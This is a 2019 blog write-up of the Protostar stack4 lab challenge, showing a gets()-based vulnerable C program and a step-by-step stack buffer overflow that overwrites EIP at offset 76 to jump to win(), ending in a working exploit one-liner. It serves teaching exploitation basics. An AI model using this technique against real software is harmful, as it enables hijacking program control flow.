<!DOCTYPE html>
<html lang="en"><head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.5.0 -->
<title>Buffer Overflow Practical Examples , Exploiting EIP - protostar stack4 | 0xRick Owned Root !</title>
<meta name="generator" content="Jekyll v3.7.4" />
<meta property="og:title" content="Buffer Overflow Practical Examples , Exploiting EIP - protostar stack4" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="note : This article is small because I didn’t want to solve stack 4 with stack 5 as stack 5 is different so I just wrote about stack 4 quickly Introduction Hey again ,Today’s article is going to be short. So last time I solved stack3 , I’m back again and today I’m going to solve stack4 which is really interesting , it’s slightly different from stack3 but that difference is a new thing to see if we compare it to the previous challenges. So let’s not talk too much and jump right in. Read my other articles about buffer overflow ./stack4 Let’s take a look at the source code first : #include &lt;stdlib.h&gt; #include &lt;unistd.h&gt; #include &lt;stdio.h&gt; #include &lt;string.h&gt; void win() { printf(&quot;code flow successfully changed\n&quot;); } int main(int argc, char **argv) { char buffer[64]; gets(buffer); } Very simple ! it defines the win function then defines the main function which sets a buffer of 64 chars and stores our input in it. But wait a second where is the variable that we’re gonna overwrite ? in the previous challenges we had a variable that is being used by a function to change the code flow , now what will we overwrite ? The answer is the EIP which is the instruction pointer. And the instruction pointer is a memory address that holds the address of the next instruction in the program during execution. So if we overwrite that address the program will execute whatever that address refers to. let’s try to exceed the buffer. python -c &quot;print &#39;A&#39; * 64&quot; The program didn’t even crash … why ? Because the return address is not directly after the buffer like in the previous challenges , Let’s try 100 chars python -c &quot;print &#39;A&#39; * 100&quot; The program crashed , Let’s find where does it exactly crash like we did in the previous challenge read it if you haven’t done yet. We will create a pattern with pattern_create ./pattern_create.rb -l 100 Then we will pass it to the program in gdb It crashes at 0x63413563 We locate that with pattern_offset ./pattern_offset.rb -q 63413563 We get exact match at offset 76 Next step is to find the address of win() objdump -d The address is 0x080483f4 Now we can build our exploit : python -c &quot;print &#39;A&#39; * 76 + &#39;\xf4\x83\x04\x08&#39;&quot; | ./stack4 And we successfully changed the code flow ! That’s it , Feedback is appreciated ! Don’t forget to read the previous articles , Tweet about the article if you liked it , follow on twitter for awesome resources @Ahm3d_H3sham Thanks for reading. Previous Buffer Overflow article : Buffer Overflow Practical Examples , metasploit , gdb and objdump ! - protostar stack3 Next Buffer Overflow article : Buffer Overflow Practical Examples , Shellcode Injection and Local Privilege Escalation - protostar stack5" />
<meta property="og:description" content="note : This article is small because I didn’t want to solve stack 4 with stack 5 as stack 5 is different so I just wrote about stack 4 quickly Introduction Hey again ,Today’s article is going to be short. So last time I solved stack3 , I’m back again and today I’m going to solve stack4 which is really interesting , it’s slightly different from stack3 but that difference is a new thing to see if we compare it to the previous challenges. So let’s not talk too much and jump right in. Read my other articles about buffer overflow ./stack4 Let’s take a look at the source code first : #include &lt;stdlib.h&gt; #include &lt;unistd.h&gt; #include &lt;stdio.h&gt; #include &lt;string.h&gt; void win() { printf(&quot;code flow successfully changed\n&quot;); } int main(int argc, char **argv) { char buffer[64]; gets(buffer); } Very simple ! it defines the win function then defines the main function which sets a buffer of 64 chars and stores our input in it. But wait a second where is the variable that we’re gonna overwrite ? in the previous challenges we had a variable that is being used by a function to change the code flow , now what will we overwrite ? The answer is the EIP which is the instruction pointer. And the instruction pointer is a memory address that holds the address of the next instruction in the program during execution. So if we overwrite that address the program will execute whatever that address refers to. let’s try to exceed the buffer. python -c &quot;print &#39;A&#39; * 64&quot; The program didn’t even crash … why ? Because the return address is not directly after the buffer like in the previous challenges , Let’s try 100 chars python -c &quot;print &#39;A&#39; * 100&quot; The program crashed , Let’s find where does it exactly crash like we did in the previous challenge read it if you haven’t done yet. We will create a pattern with pattern_create ./pattern_create.rb -l 100 Then we will pass it to the program in gdb It crashes at 0x63413563 We locate that with pattern_offset ./pattern_offset.rb -q 63413563 We get exact match at offset 76 Next step is to find the address of win() objdump -d The address is 0x080483f4 Now we can build our exploit : python -c &quot;print &#39;A&#39; * 76 + &#39;\xf4\x83\x04\x08&#39;&quot; | ./stack4 And we successfully changed the code flow ! That’s it , Feedback is appreciated ! Don’t forget to read the previous articles , Tweet about the article if you liked it , follow on twitter for awesome resources @Ahm3d_H3sham Thanks for reading. Previous Buffer Overflow article : Buffer Overflow Practical Examples , metasploit , gdb and objdump ! - protostar stack3 Next Buffer Overflow article : Buffer Overflow Practical Examples , Shellcode Injection and Local Privilege Escalation - protostar stack5" />
<link rel="canonical" href="http://localhost:4000/binary-exploitation/bof4/" />
<meta property="og:url" content="http://localhost:4000/binary-exploitation/bof4/" />
<meta property="og:site_name" content="0xRick Owned Root !" />
<meta property="og:image" content="http://localhost:4000/binary-exploitation/BOF4/0.png" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2019-01-14T00:00:00+02:00" />
<script type="application/ld+json">
{"datePublished":"2019-01-14T00:00:00+02:00","image":"http://localhost:4000/binary-exploitation/BOF4/0.png","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/binary-exploitation/bof4/"},"@type":"BlogPosting","url":"http://localhost:4000/binary-exploitation/bof4/","headline":"Buffer Overflow Practical Examples , Exploiting EIP - protostar stack4","description":"note : This article is small because I didn’t want to solve stack 4 with stack 5 as stack 5 is different so I just wrote about stack 4 quickly Introduction Hey again ,Today’s article is going to be short. So last time I solved stack3 , I’m back again and today I’m going to solve stack4 which is really interesting , it’s slightly different from stack3 but that difference is a new thing to see if we compare it to the previous challenges. So let’s not talk too much and jump right in. Read my other articles about buffer overflow ./stack4 Let’s take a look at the source code first : #include &lt;stdlib.h&gt; #include &lt;unistd.h&gt; #include &lt;stdio.h&gt; #include &lt;string.h&gt; void win() { printf(&quot;code flow successfully changed\\n&quot;); } int main(int argc, char **argv) { char buffer[64]; gets(buffer); } Very simple ! it defines the win function then defines the main function which sets a buffer of 64 chars and stores our input in it. But wait a second where is the variable that we’re gonna overwrite ? in the previous challenges we had a variable that is being used by a function to change the code flow , now what will we overwrite ? The answer is the EIP which is the instruction pointer. And the instruction pointer is a memory address that holds the address of the next instruction in the program during execution. So if we overwrite that address the program will execute whatever that address refers to. let’s try to exceed the buffer. python -c &quot;print &#39;A&#39; * 64&quot; The program didn’t even crash … why ? Because the return address is not directly after the buffer like in the previous challenges , Let’s try 100 chars python -c &quot;print &#39;A&#39; * 100&quot; The program crashed , Let’s find where does it exactly crash like we did in the previous challenge read it if you haven’t done yet. We will create a pattern with pattern_create ./pattern_create.rb -l 100 Then we will pass it to the program in gdb It crashes at 0x63413563 We locate that with pattern_offset ./pattern_offset.rb -q 63413563 We get exact match at offset 76 Next step is to find the address of win() objdump -d The address is 0x080483f4 Now we can build our exploit : python -c &quot;print &#39;A&#39; * 76 + &#39;\\xf4\\x83\\x04\\x08&#39;&quot; | ./stack4 And we successfully changed the code flow ! That’s it , Feedback is appreciated ! Don’t forget to read the previous articles , Tweet about the article if you liked it , follow on twitter for awesome resources @Ahm3d_H3sham Thanks for reading. Previous Buffer Overflow article : Buffer Overflow Practical Examples , metasploit , gdb and objdump ! - protostar stack3 Next Buffer Overflow article : Buffer Overflow Practical Examples , Shellcode Injection and Local Privilege Escalation - protostar stack5","dateModified":"2019-01-14T00:00:00+02:00","@context":"http://schema.org"}</script>
<!-- End Jekyll SEO tag -->
<link rel="stylesheet" href="/assets/css/ad.css">
  <link rel="stylesheet" href="/assets/css/style.css"><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="0xRick Owned Root !" /></head>
<!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-97164925-2"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-97164925-2');
</script>

<body><header class="site-header" role="banner">

  <div class="wrapper"><a class="site-title" rel="author" href="/">0xRick Owned Root !</a><nav class="site-nav">
        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
        <label for="nav-trigger">
          <span class="menu-icon">
            <svg viewBox="0 0 18 15" width="18px" height="15px">
              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
            </svg>
          </span>
        </label>

        <div class="trigger"><a class="page-link" href="/about/">About</a><a class="page-link" href="/categories/">Categories</a></div>
      </nav></div>
</header>
<main class="page-content" aria-label="Content">
      <div class="wrapper">
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">

  <header class="post-header">
    <h1 class="post-title p-name" itemprop="name headline">Buffer Overflow Practical Examples , Exploiting EIP - protostar stack4</h1>
    <p class="post-meta">
      <time class="dt-published" datetime="2019-01-14T00:00:00+02:00" itemprop="datePublished">Jan 14, 2019
      </time><script async type="text/javascript" src="//cdn.carbonads.com/carbon.js?serve=CK7DL23U&placement=0xrickgithubio" id="_carbonads_js"></script>
</p>
  </header>

  <div class="post-content e-content" itemprop="articleBody">
    <hr />

<h5 id="note--this-article-is-small-because-i-didnt-want-to-solve-stack-4-with-stack-5-as-stack-5-is-different-so-i-just-wrote-about-stack-4-quickly">note : This article is small because I didn’t want to solve stack 4 with stack 5 as stack 5 is different so I just wrote about stack 4 quickly</h5>
<p><br /></p>
<h3 id="introduction">Introduction</h3>
<h4 id="hey-again-todays-article-is-going-to-be-short-so-last-time-i-solved-stack3--im-back-again-and-today-im-going-to-solve-stack4-which-is-really-interesting--its-slightly-different-from-stack3-but-that-difference-is-a-new-thing-to-see-if-we-compare-it-to-the-previous-challenges-so-lets-not-talk-too-much-and-jump-right-in">Hey again ,Today’s article is going to be short. So last time I solved stack3 , I’m back again and today I’m going to solve stack4 which is really interesting , it’s slightly different from stack3 but that difference is a new thing to see if we compare it to the previous challenges. So let’s not talk too much and jump right in.</h4>
<h4 id="read-my-other-articles-about-buffer-overflow">Read my <a href="/categories">other articles about buffer overflow</a></h4>
<p><img src="/images/binary-exploitation/BOF4/0.png" alt="" /></p>
<hr />

<h3 id="stack4">./stack4</h3>
<h4 id="lets-take-a-look-at-the-source-code-first-">Let’s take a look at the source code first :</h4>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;
#include &lt;stdio.h&gt;
#include &lt;string.h&gt;

void win()
{
 printf("code flow successfully changed\n");
}

int main(int argc, char **argv)
{
 char buffer[64];

 gets(buffer);
}
</code></pre></div></div>
<h4 id="very-simple--it-defines-the-win-function-then-defines-the-main-function-which-sets-a-buffer-of-64-chars-and-stores-our-input-in-it-but-wait-a-second-where-is-the-variable-that-were-gonna-overwrite--in-the-previous-challenges-we-had-a-variable-that-is-being-used-by-a-function-to-change-the-code-flow--now-what-will-we-overwrite-">Very simple ! it defines the <code class="highlighter-rouge">win</code> function then defines the <code class="highlighter-rouge">main</code> function which sets a buffer of 64 chars and stores our input in it. But wait a second where is the variable that we’re gonna overwrite ? in the previous challenges we had a variable that is being used by a function to change the code flow , now what will we overwrite ?</h4>
<h4 id="the-answer-is-the-eip-which-is-the-instruction-pointer-and-the-instruction-pointer-is-a-memory-address-that-holds-the-address-of-the-next-instruction-in-the-program-during-execution-so-if-we-overwrite-that-address-the-program-will-execute-whatever-that-address-refers-to-lets-try-to-exceed-the-buffer">The answer is the <code class="highlighter-rouge">EIP</code> which is the instruction pointer. And the instruction pointer is a memory address that holds the address of the next instruction in the program during execution. So if we overwrite that address the program will execute whatever that address refers to. let’s try to exceed the buffer.</h4>
<p><code class="highlighter-rouge">python -c "print 'A' * 64"</code>
<img src="/images/binary-exploitation/BOF4/1.png" alt="" /></p>
<h4 id="the-program-didnt-even-crash--why--because-the-return-address-is-not-directly-after-the-buffer-like-in-the-previous-challenges--lets-try-100-chars">The program didn’t even crash … why ? Because the return address is not directly after the buffer like in the previous challenges , Let’s try 100 chars</h4>
<p><code class="highlighter-rouge">python -c "print 'A' * 100"</code>
<img src="/images/binary-exploitation/BOF4/2.png" alt="" /></p>
<h4 id="the-program-crashed--lets-find-where-does-it-exactly-crash-like-we-did-in-the-previous-challenge-read-it-if-you-havent-done-yet">The program crashed , Let’s find where does it exactly crash like we did in the <a href="/binary-exploitation/bof3">previous challenge</a> read it if you haven’t done yet.</h4>
<h4 id="we-will-create-a-pattern-with-pattern_create">We will create a pattern with <code class="highlighter-rouge">pattern_create</code></h4>
<p><code class="highlighter-rouge">./pattern_create.rb -l 100</code>
<img src="/images/binary-exploitation/BOF4/3.png" alt="" /></p>
<h4 id="then-we-will-pass-it-to-the-program-in-gdb">Then we will pass it to the program in gdb</h4>
<p><img src="/images/binary-exploitation/BOF4/4.png" alt="" /></p>
<h4 id="it-crashes-at-0x63413563">It crashes at <code class="highlighter-rouge">0x63413563</code></h4>
<h4 id="we-locate-that-with-pattern_offset">We locate that with pattern_offset</h4>
<p><code class="highlighter-rouge">./pattern_offset.rb -q 63413563</code>
<img src="/images/binary-exploitation/BOF4/5.png" alt="" /></p>
<h4 id="we-get-exact-match-at-offset-76">We get exact match at offset 76</h4>
<h4 id="next-step-is-to-find-the-address-of-win">Next step is to find the address of <code class="highlighter-rouge">win()</code></h4>
<p><code class="highlighter-rouge">objdump -d</code>
<img src="/images/binary-exploitation/BOF4/6.png" alt="" /></p>
<h4 id="the-address-is-0x080483f4">The address is <code class="highlighter-rouge">0x080483f4</code></h4>
<h4 id="now-we-can-build-our-exploit-">Now we can build our exploit :</h4>
<p><code class="highlighter-rouge">python -c "print 'A' * 76 + '\xf4\x83\x04\x08'" | ./stack4</code>
<img src="/images/binary-exploitation/BOF4/7.png" alt="" /></p>
<h4 id="and-we-successfully-changed-the-code-flow-">And we successfully changed the code flow !</h4>
<p><br />
<br /></p>
<h4 id="thats-it--feedback-is-appreciated-">That’s it , Feedback is appreciated !</h4>
<h4 id="dont-forget-to-read-the-previous-articles--tweet-about-the-article-if-you-liked-it--follow-on-twitter-for-awesome-resources-ahm3d_h3sham">Don’t forget to read the <a href="/categories">previous articles</a> , Tweet about the article if you liked it , follow on twitter for awesome resources @Ahm3d_H3sham</h4>
<h4 id="thanks-for-reading">Thanks for reading.</h4>
<p><br />
<br /></p>
<h4 id="previous-buffer-overflow-article--buffer-overflow-practical-examples--metasploit--gdb-and-objdump----protostar-stack3-">Previous Buffer Overflow article : <a href="/binary-exploitation/bof3/">Buffer Overflow Practical Examples , metasploit , gdb and objdump ! - protostar stack3 </a></h4>
<h4 id="next-buffer-overflow-article--buffer-overflow-practical-examples--shellcode-injection-and-local-privilege-escalation---protostar-stack5">Next Buffer Overflow article : <a href="/binary-exploitation/bof5/">Buffer Overflow Practical Examples , Shellcode Injection and Local Privilege Escalation - protostar stack5</a></h4>
<hr />


  </div>
<script src="https://www.hackthebox.eu/badge/65598"></script><a class="u-url" href="/binary-exploitation/bof4/" hidden></a>
</article>


      </div>
    </main><footer class="site-footer h-card">
  <data class="u-url" href="/"></data>

  <div class="wrapper">

    <h2 class="footer-heading">0xRick Owned Root !</h2>

    <div class="footer-col-wrapper">
      <div class="footer-col footer-col-1">
        <ul class="contact-list">
          <li class="p-name">0xRick Owned Root !</li></ul>
      </div>

      <div class="footer-col footer-col-2"><ul class="social-media-list"><li><a href="https://www.facebook.com/Ahm3d.H3sham"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#facebook"></use></svg> <span class="username">Ahm3d.H3sham</span></a></li><li><a href="https://github.com/0xRick"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#github"></use></svg> <span class="username">0xRick</span></a></li><li><a href="https://www.twitter.com/Ahm3d_H3sham"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#twitter"></use></svg> <span class="username">Ahm3d_H3sham</span></a></li></ul>
</div>

      <div class="footer-col footer-col-3">
        <p>Infosec Blog , CTF and Hack The Box write-ups , articles and other stuff</p>
      </div>
    </div>

  </div>

</footer>
</body>

</html>

